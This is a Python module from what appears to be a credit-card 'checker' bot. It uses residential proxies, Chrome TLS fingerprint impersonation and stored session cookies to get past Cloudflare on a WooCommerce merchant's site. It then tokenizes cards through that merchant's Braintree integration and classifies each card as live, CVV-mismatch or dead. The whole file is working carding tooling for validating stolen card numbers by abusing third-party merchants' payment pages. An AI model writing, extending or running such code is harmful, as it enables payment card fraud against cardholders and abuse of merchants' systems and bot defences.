"""
gateways/b3_gate.py — B3 WooCommerce + Braintree Auth Gate

Uses curl-cffi (Chrome TLS fingerprint impersonation) + residential proxy
to bypass Cloudflare Bot Management without needing cf_clearance cookies.

Flow:
  1. GET site/my-account/add-payment-method/ via proxy (Chrome fingerprint)
     → Cloudflare passes request (residential IP + Chrome TLS = legit)
     → Extract woocommerce-nonce + Braintree auth fingerprint
  2. POST https://payments.braintree-api.com/graphql
     → Tokenize card (validate:False — NO charge)
  3. POST site/my-account/add-payment-method/ via proxy
     → Parse WooCommerce response
     → Return LIVE / DEAD / CCStatus

No account risk — uses target merchant's WooCommerce/Braintree setup.
"""
import asyncio
import base64
import json
import random
import re
import logging
from urllib.parse import urlparse

from gateways.base import GatewayResult, CCStatus
from core.parser import CardData
from core.proxy_manager import get_random_proxy

logger = logging.getLogger("CC-Checker.B3")

TIMEOUT = 30  # seconds

# ── Response message → CCStatus ────────────────────────────────────────────────
APPROVED_MESSAGES = [
    "nice! new payment method added",
    "payment method successfully added",
    "payment method added successfully",
    "payment method added",
]
LIVE_MESSAGES = [
    "insufficient funds",
    "gateway rejected: avs",
    "invalid postal code",
    "duplicate",
    "you cannot add a new payment method so soon",
    "please wait",
]
CVV_MESSAGES = [
    "card issuer declined cvv",
    "gateway rejected: cvv",
    "gateway rejected: avs_and_cvv",
]


def _parse_response(message: str) -> tuple[CCStatus, str, bool]:
    msg_lower = message.lower().strip()
    for pat in APPROVED_MESSAGES:
        if pat in msg_lower:
            return CCStatus.LIVE_VBV, "Payment Method Added ✅", True
    for pat in CVV_MESSAGES:
        if pat in msg_lower:
            return CCStatus.CHARGED, f"CVV Mismatch | {message[:60]}", True
    for pat in LIVE_MESSAGES:
        if pat in msg_lower:
            return CCStatus.INSUFFICIENT, f"{message[:80]}", True
    return CCStatus.DEAD, message[:100] or "Declined", False


def _get_proxy_url() -> str | None:
    """Get a random proxy from the pool in http://user:pass@host:port format."""
    try:
        proxy = get_random_proxy()
        if not proxy:
            return None
        # Proxy format in our system: socks5://user:pass@host:port or http://...
        # curl-cffi needs: http://user:pass@host:port
        if proxy.startswith("socks5://"):
            return proxy  # curl-cffi supports socks5
        return proxy
    except Exception:
        return None


def _make_headers(site_url: str) -> dict:
    return {
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
        "User-Agent": (
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
            "AppleWebKit/537.36 (KHTML, like Gecko) "
            "Chrome/137.0.0.0 Safari/537.36"
        ),
        "Referer": f"{site_url}/my-account/payment-methods/",
        "Upgrade-Insecure-Requests": "1",
        "sec-ch-ua": '"Google Chrome";v="137", "Chromium";v="137", "Not/A)Brand";v="24"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "document",
        "sec-fetch-mode": "navigate",
        "sec-fetch-site": "same-origin",
        "dnt": "1",
    }


async def _get_auth(site_url: str, cookies: dict, proxy: str | None) -> tuple[str | None, str | None]:
    """Step 1: Get WooCommerce nonce + Braintree auth fingerprint."""
    from curl_cffi.requests import AsyncSession

    url = f"{site_url}/my-account/add-payment-method/"
    headers = _make_headers(site_url)

    try:
        async with AsyncSession(impersonate="chrome137") as session:
            r = await session.get(
                url,
                headers=headers,
                cookies=cookies,
                proxies={"https": proxy, "http": proxy} if proxy else None,
                timeout=TIMEOUT,
                allow_redirects=True,
            )
            html = r.text

            logger.debug(f"B3 auth status: {r.status_code}, CF: {r.headers.get('cf-ray','none')}")

            if r.status_code == 403 or "just a moment" in html.lower():
                logger.warning("B3: Cloudflare challenge hit — try different proxy")
                return None, None

            # Extract nonce
            nonces = re.findall(
                r'name="woocommerce-add-payment-method-nonce"\s+value="([^"]+)"', html
            )
            if not nonces:
                return None, None

            # Extract Braintree client token
            i0 = html.find('wc_braintree_client_token = ["')
            if i0 == -1:
                return None, None
            i1 = html.find('"]', i0)
            if i1 == -1:
                return None, None

            token_b64 = html[i0 + 30:i1]
            decoded = base64.b64decode(token_b64 + "==").decode("utf-8", errors="replace")
            fingerprints = re.findall(r'"authorizationFingerprint":"([^"]+)"', decoded)
            if not fingerprints:
                return None, None

            return nonces[0], fingerprints[0]

    except Exception as e:
        logger.debug(f"B3 auth error: {type(e).__name__}: {e}")
        return None, None


async def _tokenize_card(auth_fingerprint: str, card: CardData, proxy: str | None) -> str | None:
    """Step 2: Tokenize card via Braintree GraphQL (no charge)."""
    from curl_cffi.requests import AsyncSession

    exp_year = card.year if len(card.year) == 4 else f"20{card.year}"

    payload = {
        "clientSdkMetadata": {
            "source": "client",
            "integration": "custom",
            "sessionId": f"{random.randint(10**8, 10**9)}-{random.randint(1000, 9999)}-"
                         f"{random.randint(1000, 9999)}-{random.randint(1000, 9999)}-"
                         f"{random.randint(10**11, 10**12)}",
        },
        "query": (
            "mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {"
            " tokenizeCreditCard(input: $input) {"
            " token creditCard { bin brandCode last4 expirationMonth expirationYear"
            " binData { prepaid healthcare debit issuingBank countryOfIssuance } } } }"
        ),
        "variables": {
            "input": {
                "creditCard": {
                    "number":          card.number,
                    "expirationMonth": card.month.zfill(2),
                    "expirationYear":  exp_year,
                    "cvv":             card.cvv,
                    "billingAddress": {
                        "postalCode":    "10080",
                        "streetAddress": "147 street",
                    },
                },
                "options": {"validate": False},
            }
        },
        "operationName": "TokenizeCreditCard",
    }

    headers = {
        "Authorization":     f"Bearer {auth_fingerprint}",
        "Braintree-Version": "2018-05-10",
        "Content-Type":      "application/json",
        "Accept":            "*/*",
        "Origin":            "https://assets.braintreegateway.com",
        "Referer":           "https://assets.braintreegateway.com/",
        "User-Agent": (
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
            "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36"
        ),
    }

    try:
        async with AsyncSession(impersonate="chrome137") as session:
            r = await session.post(
                "https://payments.braintree-api.com/graphql",
                headers=headers,
                json=payload,
                proxies={"https": proxy, "http": proxy} if proxy else None,
                timeout=TIMEOUT,
            )
            if r.status_code != 200:
                return None
            data = r.json()
            return (
                data.get("data", {})
                    .get("tokenizeCreditCard", {})
                    .get("token")
            )
    except Exception as e:
        logger.debug(f"B3 tokenize error: {e}")
        return None


async def _submit_payment(
    site_url: str, cookies: dict, token: str, nonce: str, proxy: str | None
) -> str:
    """Step 3: Submit tokenized card to WooCommerce add-payment-method."""
    from curl_cffi.requests import AsyncSession

    data = {
        "payment_method":                       "braintree_cc",
        "braintree_cc_nonce_key":               token,
        "braintree_cc_device_data":             '{"correlation_id":"b3checker"}',
        "braintree_cc_3ds_nonce_key":           "",
        "woocommerce-add-payment-method-nonce": nonce,
        "_wp_http_referer":                     "/my-account/add-payment-method/",
        "woocommerce_add_payment_method":       "1",
    }
    headers = {
        "Content-Type":             "application/x-www-form-urlencoded",
        "Accept":                   "text/html,application/xhtml+xml,*/*;q=0.8",
        "Accept-Language":          "en-US,en;q=0.9",
        "Origin":                   site_url,
        "Referer":                  f"{site_url}/my-account/add-payment-method/",
        "Upgrade-Insecure-Requests": "1",
        "User-Agent": (
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
            "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36"
        ),
    }

    try:
        async with AsyncSession(impersonate="chrome137") as session:
            r = await session.post(
                f"{site_url}/my-account/add-payment-method/",
                headers=headers,
                cookies=cookies,
                data=data,
                proxies={"https": proxy, "http": proxy} if proxy else None,
                timeout=TIMEOUT,
                allow_redirects=True,
            )
            html = r.text

        # Extract WooCommerce notice
        match = re.search(
            r'class="woocommerce-notices-wrapper"[^>]*>(.*?)</div>',
            html, re.DOTALL | re.IGNORECASE
        )
        if match:
            raw = re.sub(r'<[^>]+>', '', match.group(1)).strip()
            if raw:
                return raw

        for pattern in [
            r'woocommerce-error[^>]*>(.*?)</[uo]l>',
            r'woocommerce-message[^>]*>(.*?)</[uo]l>',
            r'woocommerce-info[^>]*>(.*?)</div>',
        ]:
            m = re.search(pattern, html, re.DOTALL | re.IGNORECASE)
            if m:
                raw = re.sub(r'<[^>]+>', '', m.group(1)).strip()
                if raw:
                    return raw

        return "No response message found"

    except Exception as e:
        logger.debug(f"B3 submit error: {e}")
        return f"Error: {e}"


async def check_b3_gate(card: CardData) -> GatewayResult:
    """
    Main B3 WooCommerce + Braintree gate check.
    Uses curl-cffi (Chrome fingerprint) + residential proxy for Cloudflare bypass.
    No charge on card — $0 soft auth only.
    """
    import database.db as db

    cfg = await db.b3_get_config()
    if not cfg or not cfg.get("site_url"):
        return GatewayResult(
            status=CCStatus.ERROR,
            gateway="B3-Braintree",
            message="B3 Gate not configured. Use /b3site to set URL.",
            raw_code="not_configured",
        )

    pairs = await db.b3_get_active_pairs()
    if not pairs:
        return GatewayResult(
            status=CCStatus.ERROR,
            gateway="B3-Braintree",
            message="No cookie pairs. Use /b3addpair to add.",
            raw_code="no_cookies",
        )

    site_url = cfg["site_url"]
    pair = random.choice(pairs)

    try:
        cookies1 = json.loads(pair["cookie1"])
        cookies2 = json.loads(pair["cookie2"])
    except Exception:
        return GatewayResult(
            status=CCStatus.ERROR,
            gateway="B3-Braintree",
            message=f"Cookie pair '{pair['pair_id']}' corrupted. Re-add with /b3addpair.",
            raw_code="cookie_parse_error",
        )

    # Get residential proxy
    proxy = _get_proxy_url()
    if proxy:
        logger.debug(f"B3 using proxy: {proxy[:30]}...")
    else:
        logger.debug("B3: No proxy available, trying without proxy")

    try:
        # Step 1: Auth
        nonce, fingerprint = await _get_auth(site_url, cookies1, proxy)
        if not nonce or not fingerprint:
            # Retry with different proxy once
            proxy2 = _get_proxy_url()
            if proxy2 and proxy2 != proxy:
                nonce, fingerprint = await _get_auth(site_url, cookies1, proxy2)
                if nonce:
                    proxy = proxy2

        if not nonce or not fingerprint:
            return GatewayResult(
                status=CCStatus.ERROR,
                gateway="B3-Braintree",
                message=(
                    "Auth failed — cookies expired OR Cloudflare blocking proxy. "
                    "Refresh cookies with /b3addpair"
                ),
                raw_code="auth_failed",
                extra={"pair_id": pair["pair_id"]},
            )

        # Step 2: Tokenize
        token = await _tokenize_card(fingerprint, card, proxy)
        if not token:
            return GatewayResult(
                status=CCStatus.ERROR,
                gateway="B3-Braintree",
                message="Braintree tokenization failed",
                raw_code="tokenize_failed",
            )

        # Step 3: Submit
        response_msg = await _submit_payment(site_url, cookies2, token, nonce, proxy)

    except asyncio.TimeoutError:
        return GatewayResult(
            status=CCStatus.ERROR,
            gateway="B3-Braintree",
            message="Request timed out",
            raw_code="timeout",
        )
    except ImportError:
        return GatewayResult(
            status=CCStatus.ERROR,
            gateway="B3-Braintree",
            message="curl-cffi not installed. Run: pip install curl-cffi",
            raw_code="missing_dep",
        )
    except Exception as e:
        return GatewayResult(
            status=CCStatus.ERROR,
            gateway="B3-Braintree",
            message=f"{type(e).__name__}: {e}",
            raw_code="exception",
        )

    # Update stats
    await db.b3_mark_pair_used(pair["pair_id"])
    status, reason, is_live = _parse_response(response_msg)
    await db.b3_increment_stats(live=is_live)

    domain = urlparse(site_url).netloc
    is_vbv    = status in (CCStatus.LIVE_VBV, CCStatus.LIVE_3DS)
    is_nonvbv = status == CCStatus.CHARGED

    return GatewayResult(
        status=status,
        gateway="B3-Braintree",
        message=reason,
        raw_code=status.value,
        is_vbv=is_vbv,
        is_non_vbv=is_nonvbv,
        extra={
            "pair_id":  pair["pair_id"],
            "site":     domain,
            "raw_msg":  response_msg[:100],
            "proxy":    proxy[:20] if proxy else "none",
        },
    )
